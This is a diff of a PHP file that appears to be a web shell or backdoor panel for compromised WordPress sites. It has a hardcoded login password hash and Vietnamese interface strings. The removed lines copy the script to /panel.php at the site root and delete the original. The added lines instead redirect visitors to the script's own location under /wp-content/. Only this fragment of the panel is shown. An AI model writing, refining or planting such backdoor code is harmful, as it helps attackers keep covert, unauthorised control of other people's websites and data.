@@ -59,13 +59,10 @@ if (!function_exists('scandir')) {
 }
 if (function_exists('wp_insert_post') || defined('WP_HOME') || function_exists('is_wp_error') ||
 	function_exists('add_action')) {
-	$panel = $root . '/panel.php';
-	if (is_file($panel))
-		unlink($panel);
-	file_put_contents($panel, file_get_contents(__FILE__));
-	unlink(__FILE__);
-	header('Location: /panel.php');
-	echo '<script>location.href="/panel.php";</script>';
+	$loc = explode('/wp-content/', __FILE__);
+	$loc = '/wp-content/'.$loc[1];
+	header('Location: '.$loc);
+	echo '<script>location.href="'.$loc.'";</script>';
 	exit;
 }
 ?>
@@ -131,11 +128,7 @@ if (!empty($mo)) {
 //Password
 $password = md5('VinhNoName:'.md5('vinhja.xt'));
 $GLOBALS['password'] = $password;
-$_http_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ?
-	$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT'] : 'localhost');
-$_script_url = 'http' . ((isset($_ENV['HTTPS']) && $_ENV['HTTPS'] == 'on') || $_SERVER['SERVER_PORT'] ==
-	443 ? 's' : '') . '://' . $_http_host . $_SERVER['PHP_SELF'];
-$_script_base = substr($_script_url, 0, strrpos($_script_url, '/') + 1);
+$_script_url = explode('?',$_SERVER['REQUEST_URI'])[0];
 //$lang[26]
 $lang['vi'] = array(
 	'Mật khẩu: ',
